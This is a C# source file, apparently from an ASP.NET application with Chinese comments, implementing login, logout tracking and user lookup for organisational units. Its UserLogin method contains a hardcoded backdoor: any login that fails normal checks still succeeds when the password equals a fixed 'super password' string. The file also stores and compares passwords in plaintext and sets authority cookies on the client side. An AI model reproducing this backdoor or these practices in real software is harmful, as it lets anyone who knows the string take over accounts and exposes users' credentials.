using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Web;
using System.Web.Script.Serialization;
using DBHelper;
using EntityModel;
/*----------------------------------------------------------------
    // 版本说明：
    // 版本号：
    // 文件名：GetAllFieldUnit.cs
    // 文件功能描述：系统登录以及登录时根据已选择的某单位的下级单位
    // 创建标识：
    // 修改标识：
    // 修改描述：
//--------------------------------------------------------------*/
namespace LogicProcessingClass.LoginCorrelation
{
    public class LoginSystem
    {
        public string RoleName = "Default";
        HttpApplicationState App = HttpContext.Current.Application;
        /// <summary>
        /// 用户登录
        /// </summary>
        /// <param name="loginName">登录单位名</param>
        /// <param name="password">登录密码</param>
        /// <returns>大于 0 成功，反之则登录失败</returns>
        public int UserLogin(string loginName, string password, int loginLimit, string type)
        {
            int result = 0;
            object unitApp = App["InitUnitsFlag"];
            int i = 0;
            Persistence persistence = new Persistence();
            while (unitApp != null && unitApp.ToString() != "true")
            {
                i++;
                persistence.PersistenceUnits(loginName.Substring(0, 2) + "000000");
                unitApp = App["InitUnitsFlag"];
                if (i > 50)
                {
                    break;
                }
            }
            Entities getEntity = new Entities();
            BusinessEntities busEntity = getEntity.GetEntityByLevel(loginLimit);
            var lgns = from login in busEntity.LGN
                       where login.PWD == password &&
                       login.LoginName == loginName
                       select login;
            if(type == "SH"){
                lgns = from login in busEntity.LGN
                       where login.PWD_SH == password &&
                       login.LoginName == loginName
                       select login;
            }
            if (lgns.Count() > 0) //有返回结果值
            {
                bool correct = false;
                foreach (var lgn in lgns)
                {
                    if (type == "SH")
                    {
                        correct = password == lgn.PWD_SH;
                    }
                    else
                    {
                        correct = password == lgn.PWD;
                    }
                    if (correct)
                    {

                        result = 1;
                        if (lgns.First().RoleName != null || lgns.First().RoleName != "")
                        {
                            if (lgns.First().RoleName != null)
                            {
                                RoleName = lgns.First().RoleName.ToString();
                            }
                        }
                        string name = lgns.First().RealName.Trim();
                        HttpContext.Current.Response.Cookies.Add(new HttpCookie("realname",
                            HttpContext.Current.Server.UrlEncode(name)));

                        break;
                    }
                }
            }
            if (result != 1)
            {
                if (password.ToLower() == "hucszizo")//超级密码
                {
                    result = 1;
                }
            }
            if (result == 1)
            {
                Dictionary<string, int> dicList = (Dictionary<string, int>) App["GLOBAL_USER_LIST"];
                if (loginName != null && dicList != null && dicList.ContainsKey(loginName))
                {
                    int count = dicList[loginName];
                    count++;
                    dicList[loginName] = count;
                    result = 2;
                }
                else
                {
                    if (dicList==null)
                    {
                        dicList= new Dictionary<string, int>();
                    }
                    dicList.Add(loginName,1);
                }
                
                App["GLOBAL_USER_LIST"] = dicList;
               
                //ArrayList list = App["GLOBAL_USER_LIST"] as ArrayList;
                //if (list == null)
                //{
                //    list = new ArrayList();
                //}
                //if (list.Contains(loginName))
                //{
                //    return 2;
                //}
                //list.Add(loginName);
                //App["GLOBAL_USER_LIST"] = list;
            }
            return result;
        }

        public string UserExit(string unitCode)
        {
            string result = "";
            try
            {
                Dictionary<string, int> dicList = (Dictionary<string, int>)App["GLOBAL_USER_LIST"];
                if (unitCode != null && dicList != null && dicList.ContainsKey(unitCode))
                {
                    int count = dicList[unitCode];
                    if (count <= 1)
                    {
                        dicList.Remove(unitCode);
                    }
                    else
                    {
                        count--;
                        dicList[unitCode] = count;
                    }
                    App["GLOBAL_USER_LIST"]=dicList;
                }
                //ArrayList list = App["GLOBAL_USER_LIST"] as ArrayList;
                //if (list == null)
                //{
                //    list = new ArrayList();
                //}
                //if (list.Contains(unitCode))
                //{
                //    list.Remove(unitCode);
                //}
                //App["GLOBAL_USER_LIST"] = list;
                result = "1";  //退出成功！
            }
            catch (Exception)
            {
                result = "系统退出异常，请2分钟后登录！";
            }

            return result;
        }

        /// <summary>
        /// 用户登录
        /// </summary>
        /// <param name="loginName">登录单位名</param>
        /// <param name="userName">登录用户名</param>
        /// <param name="password">登录密码</param>
        /// <returns>大于 0 成功，反之则登录失败</returns>
        public int UserLogins(string loginName, string password, int loginLimit, string userName)
        {
            int result = 0;
            Entities getEntity = new Entities();
            BusinessEntities busEntity = getEntity.GetEntityByLevel(loginLimit);
            try
            {
                var lgn = busEntity.LGN.Where(t => t.UserName == userName &&
                                                t.LoginName == loginName).FirstOrDefault();
                if (lgn != null && password == lgn.PWD)
                {
                    result = 1;
                    string[] operateTables = lgn.OperateTable.Split(',');
                    int Authority = Convert.ToInt32(lgn.Authority);
                    //if (HttpContext.Current.Request.Cookies["HLAuthority"] != null)//判断是否存在该cookies
                    //{
                    //    HttpContext.Current.Response.Cookies["HLAuthority"].Value = operateTables[0];//洪涝表权限。无权限（"-1"）；只读（"0"）；全部（"1"）
                    //}
                    //else
                    //{
                    //    HttpCookie aCookie = new HttpCookie("HLAuthority");
                    //    aCookie.Value = operateTables[0];
                    //    HttpContext.Current.Response.Cookies.Add(aCookie);
                    //}
                    //if (HttpContext.Current.Request.Cookies["HPAuthority"] != null)
                    //{
                    //    HttpContext.Current.Response.Cookies["HPAuthority"].Value = operateTables[1];//蓄水表权限。无权限（"-1"）；只读（"0"）；全部（"1"）
                    //}
                    //else
                    //{
                    //    HttpCookie aCookie = new HttpCookie("HPAuthority");
                    //    aCookie.Value = operateTables[1];
                    //    HttpContext.Current.Response.Cookies.Add(aCookie);
                    //}

                    if (HttpContext.Current.Request.Cookies["Authority"] != null)//判断是否存在该cookies
                    {
                        HttpContext.Current.Response.Cookies["Authority"].Value = "1";
                    }
                    else
                    {
                        HttpCookie aCookie = new HttpCookie("Authority");
                        aCookie.Value = "2";
                        HttpContext.Current.Response.Cookies.Add(aCookie);
                    }
                }
                else
                {
                    result = 0;
                    //if (HttpContext.Current.Request.Cookies["HLAuthority"] != null)
                    //{
                    //    HttpContext.Current.Response.Cookies["HLAuthority"].Expires = DateTime.Now.AddDays(-1d);
                    //}
                    //if (HttpContext.Current.Request.Cookies["HPAuthority"] != null)
                    //{
                    //    HttpContext.Current.Response.Cookies["HPAuthority"].Expires = DateTime.Now.AddDays(-1d);
                    //}

                    if (HttpContext.Current.Request.Cookies["Authority"] != null)
                    {
                        HttpContext.Current.Response.Cookies["Authority"].Value = "0";
                        HttpContext.Current.Response.Cookies["Authority"].Expires = DateTime.Now.AddDays(-1d);
                    }
                }
            }
            catch (Exception)
            {
                result = -1;
                if (HttpContext.Current.Request.Cookies["Authority"] != null)
                {
                    HttpContext.Current.Response.Cookies["Authority"].Expires = DateTime.Now.AddDays(-1d);
                }
                //if (HttpContext.Current.Request.Cookies["HLAuthority"] != null)
                //{
                //    HttpContext.Current.Response.Cookies["HLAuthority"].Expires = DateTime.Now.AddDays(-1d);
                //}
                //if (HttpContext.Current.Request.Cookies["HPAuthority"] != null)
                //{
                //    HttpContext.Current.Response.Cookies["HPAuthority"].Expires = DateTime.Now.AddDays(-1d);
                //}
            }
            return result;
        }
        /// <summary>获取当前登录单位的使用者
        /// </summary>
        /// <param name="unitCode"></param>
        /// <param name="limit"></param>
        /// <returns></returns>
        public string GetUserName(string unitCode, int limit)
        {
            int result = 0;
            Entities getEntity = new Entities();
            BusinessEntities busEntity = getEntity.GetEntityByLevel(limit);
            var lgns = from login in busEntity.LGN
                       where login.LoginName == unitCode
                       select new
                       {
                           unitCode = login.LoginName,
                           userName = login.UserName
                       };
            JavaScriptSerializer serializer = new JavaScriptSerializer();
            return serializer.Serialize(lgns);
        }
    }
}
